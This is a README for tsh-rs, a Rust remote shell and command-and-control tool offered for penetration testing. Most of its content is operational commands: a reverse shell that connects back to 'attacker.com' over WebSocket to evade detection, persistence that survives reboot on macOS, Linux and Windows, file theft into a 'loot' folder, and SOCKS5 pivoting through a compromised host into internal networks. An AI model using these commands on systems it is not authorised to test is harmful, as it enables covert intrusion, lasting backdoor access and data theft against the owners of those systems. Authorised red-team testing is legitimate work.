# tsh-rs

[![CI](https://github.com/7a6163/tsh-rs/actions/workflows/ci.yml/badge.svg)](https://github.com/7a6163/tsh-rs/actions/workflows/ci.yml)
[![Tests](https://github.com/7a6163/tsh-rs/actions/workflows/test.yml/badge.svg)](https://github.com/7a6163/tsh-rs/actions/workflows/test.yml)

A Rust implementation of Tiny Shell (tsh) -- a secure remote shell tool for penetration testing, with encrypted communication, cross-platform persistence, and network pivoting.

## Table of Contents

- [Quick Start](#quick-start)
- [Features](#features)
- [Architecture](#architecture)
- [Usage](#usage)
- [Command Line Reference](#command-line-reference)
- [Cross-Platform Support](#cross-platform-support)
- [Building](#building)
- [Development](#development)
- [Changelog](#changelog)
- [License](#license)

## Quick Start

```bash
# Build
cargo build --release

# Terminal 1: start server (agent)
./target/release/tsh server --psk mysecret --port 4444

# Terminal 2: connect client (operator)
./target/release/tsh client --psk mysecret 127.0.0.1:4444
# You now have an interactive shell
```

## Features

- **Encrypted Communication** -- [Noise Protocol](#security) (ChaCha20-Poly1305, X25519, BLAKE2s)
- **Cross-platform** -- Linux, Windows, macOS (single unified binary)
- **Operation Modes** -- Interactive shell, file transfer (get/put), command execution, system info collection, SOCKS5 proxy
- **Connection Modes** -- Direct connect, connect-back (reverse shell), WebSocket transport
- **Evasion** -- Jitter on connect-back delay (±25%, automatic), C2 over WebSocket to blend with HTTPS traffic
- **Persistence** -- Autostart on reboot via LaunchAgent (macOS), systemd (Linux), Registry (Windows)
- **Async I/O** -- Built on Tokio for high-performance concurrent connections

## Architecture

### Core Modules

| Module | Purpose |
|--------|---------|
| `noise.rs` | Noise Protocol encryption layer over any async stream |
| `pty.rs` | Cross-platform pseudo-terminal abstraction |
| `client.rs` | Client operations (shell, file transfer, commands) |
| `server.rs` | Server handlers for all operation modes |
| `socks5.rs` | RFC 1928 SOCKS5 proxy, one Noise session per connection |
| `sysinfo.rs` | Agent reconnaissance (hostname, OS, arch, user, privileges) |
| `persistence.rs` | Cross-platform autostart (LaunchAgent / systemd / Registry) |
| `c2_https.rs` | WebSocket transport adapter (WsByteStream wraps WS as AsyncRead/AsyncWrite) |
| `terminal.rs` | Line editing, command history, cursor navigation |

### Security

Protocol: `Noise_XX_25519_ChaChaPoly_BLAKE2s` with PSK challenge-response.

1. **Key Exchange** -- X25519 elliptic curve Diffie-Hellman (perfect forward secrecy)
2. **Handshake** -- Noise XX pattern with mutual authentication
3. **Encryption** -- ChaCha20-Poly1305 AEAD (confidentiality + integrity)
4. **Hashing** -- BLAKE2s
5. **PSK Auth** -- HMAC-SHA256 challenge-response over encrypted channel (constant-time comparison)
6. **Message Framing** -- `[4-byte BE length][encrypted payload + 16-byte Poly1305 tag]`

### Transport Layers

| Transport | Flag | Traffic Appearance |
|-----------|------|--------------------|
| Raw TCP | (default) | Encrypted binary on custom port |
| WebSocket | `--transport https` | Standard HTTP upgrade + WS frames |

Both transports run the same Noise Protocol underneath. The `NoiseLayer` accepts any `AsyncRead + AsyncWrite` stream.

## Usage

### Server Mode (Agent)

```bash
# Listen for connections
./tsh server --psk SECRET --port 4444

# Connect-back mode (reverse shell, jitter applied automatically)
./tsh server --psk SECRET --connect-back 10.0.0.1 --port 4444 --delay 20

# Connect-back over WebSocket
./tsh server --psk SECRET --connect-back attacker.com --port 443 --transport https

# Install persistence + start agent
./tsh server --psk SECRET --connect-back 10.0.0.1 --port 4444 --install

# Remove persistence
./tsh server --uninstall
```

### Client Mode (Operator)

```bash
# Interactive shell
./tsh client --psk SECRET 10.0.0.5:4444

# Wait for connect-back agent
./tsh client --psk SECRET cb --port 4444

# Query agent system info
./tsh client --psk SECRET 10.0.0.5:4444 sysinfo

# Execute a command
./tsh client --psk SECRET 10.0.0.5:4444 "whoami && id"

# Download file
./tsh client --psk SECRET 10.0.0.5:4444 get:data/secrets.db:./loot/

# Upload file
./tsh client --psk SECRET 10.0.0.5:4444 put:./payload.sh:uploads

# Start SOCKS5 proxy (default 127.0.0.1:1080)
./tsh client --psk SECRET 10.0.0.5:4444 socks5

# SOCKS5 on custom bind address
./tsh client --psk SECRET 10.0.0.5:4444 socks5:0.0.0.0:9050
```

### Operational Scenarios

**Deploy persistent agent with WebSocket C2:**

```bash
# On target (one-time): install persistence, agent auto-starts on reboot
./tsh server --psk OPS_KEY --connect-back attacker.com --port 443 --transport https --install

# On attacker: wait for agent connection over WebSocket
./tsh client --psk OPS_KEY cb --port 443 --transport https
# Agent connects, sysinfo displayed automatically, then interactive shell
```

**Pivot into internal network via SOCKS5:**

```bash
# Connect to agent on compromised DMZ host
./tsh client --psk OPS_KEY 10.0.0.5:4444 socks5

# Use any tool through the proxy
curl --proxy socks5://127.0.0.1:1080 http://192.168.1.100/admin
proxychains nmap -sT 192.168.1.0/24
```

## Command Line Reference

### Server (`tsh server`)

| Flag | Description | Default |
|------|-------------|---------|
| `--psk <PSK>` | Pre-shared key for authentication | required* |
| `-p, --port <PORT>` | Port number | 1234 |
| `-c, --connect-back <HOST>` | Connect back to client host | -- |
| `-d, --delay <SECONDS>` | Connect-back delay (jitter ±25% applied automatically) | 5 |
| `-t, --transport <TYPE>` | Transport: `tcp` or `https` (WebSocket) | tcp |
| `--install` | Install persistence (autostart on reboot) | -- |
| `--uninstall` | Remove persistence | -- |
| `--config <PATH>` | Load settings from config file | -- |

*Not required with `--config` or `--uninstall`.

### Client (`tsh client`)

| Flag | Description | Default |
|------|-------------|---------|
| `--psk <PSK>` | Pre-shared key for authentication | required |
| `-p, --port <PORT>` | Port number | 1234 |
| `-t, --transport <TYPE>` | Transport: `tcp` or `https` (WebSocket) | tcp |
| `<HOST>` | Target hostname or `cb` for connect-back mode | required |
| `[ACTION]` | See actions below | interactive shell |

**Actions:**

| Action | Example | Description |
|--------|---------|-------------|
| (none) | | Interactive shell |
| `sysinfo` | `sysinfo` | Query agent system info |
| `get:remote:local` | `get:data/file.db:./loot/` | Download file |
| `put:local:remote` | `put:./tool.sh:uploads` | Upload file |
| `socks5` | `socks5` or `socks5:0.0.0.0:9050` | Start SOCKS5 proxy |
| `cmd:command` | `cmd:whoami` | Execute command |
| any string | `"ls -la"` | Execute as shell command |

## Cross-Platform Support

| Platform | Architecture | Build | Persistence |
|----------|-------------|-------|-------------|
| Linux | x86_64 | ✅ | ✅ systemd user service |
| Linux | ARM64 | ✅ | ✅ systemd user service |
| Windows | x86_64 | ✅ | ✅ Registry Run key |
| macOS | x86_64 | ✅ | ✅ LaunchAgent |
| macOS | ARM64 | ✅ | ✅ LaunchAgent |
| FreeBSD | x86_64 | ✅ | -- |
| OpenBSD | x86_64 | ✅ | -- |

## Building

### Prerequisites

```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
make install-targets  # optional: cross-compilation targets
```

### Build Commands

```bash
make dev              # Development build
make linux            # Linux x64 release
make macos            # macOS x64 + ARM64 release
make windows          # Windows x64 release
make clean            # Clean build artifacts
```

Release builds use LTO, symbol stripping, `panic=abort`, and `opt-level=3` for minimal binary size with no debug symbols.

See `make help` for all available commands.

## Development

```bash
make test             # Run tests
make fmt              # Format code
make clippy           # Run linter
```

## Changelog

See [CHANGELOG.md](CHANGELOG.md) for detailed version history and release notes.

## License

MIT License - see [LICENSE](LICENSE) for details.
